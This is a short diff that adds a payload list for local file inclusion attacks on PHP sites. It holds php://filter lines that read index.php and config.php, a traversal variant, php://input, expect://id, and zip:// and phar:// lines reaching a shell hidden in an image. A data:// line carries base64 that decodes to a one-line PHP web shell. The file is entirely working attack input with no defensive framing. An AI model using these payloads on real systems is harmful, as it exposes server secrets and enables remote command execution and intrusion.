@@ -1,0 +1,11 @@
+# LFI - PHP Wrapper Payloads
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=config.php
+php://filter/read=convert.base64-encode/resource=../config.php
+php://filter/read=string.rot13/resource=index.php
+php://input
+php://fd/0
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+expect://id
+zip://shell.jpg%23shell.php
+phar://shell.jpg/shell.php
